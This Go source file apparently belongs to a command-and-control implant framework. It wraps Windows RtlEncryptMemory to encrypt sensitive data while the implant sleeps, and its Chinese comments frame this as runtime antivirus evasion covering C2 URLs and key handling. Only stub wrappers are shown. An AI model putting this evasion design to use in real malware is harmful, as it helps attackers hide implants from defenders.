package sleepcrypt

// 免杀 R-1a（运行时免杀，方案：docs/运行时免杀R组实施方案-SleepCrypt与Unhooking.md）：
// 睡眠窗口期敏感堆内存加密。Windows 经 ntdll RtlEncryptMemory/RtlDecryptMemory
// （RTL_ENCRYPT_MEMORY_SAME_PROCESS——密钥由系统按进程派生管理，不落 Go 堆）；
// 非 windows 平台不支持（返回 ErrUnsupported，调用方回落不加密路径）。
//
// 覆盖边界（红线对齐，不夸大）：保护的是可被本包持有的 []byte 运行时敏感数据
// （如睡眠期任务结果队列）；模板渲染进 rodata 的字符串常量（C2 URL、密钥字面量）
// 归 garble -literals/-tiny 与 R-1.2 密钥驻留重构管辖，见方案 §二·R-1a。

import "errors"

// ErrUnsupported 当前平台不支持（调用方回落不加密路径）。
var ErrUnsupported = errors.New("sleepcrypt: platform not supported")

// Seal 加密明文：自动追加 8 字节长度头并 8 字节对齐（RTL 要求），返回密文。
func Seal(plain []byte) ([]byte, error) { return seal(plain) }

// Unseal 解密 Seal 的产物，还原原始明文。
func Unseal(cipher []byte) ([]byte, error) { return unseal(cipher) }
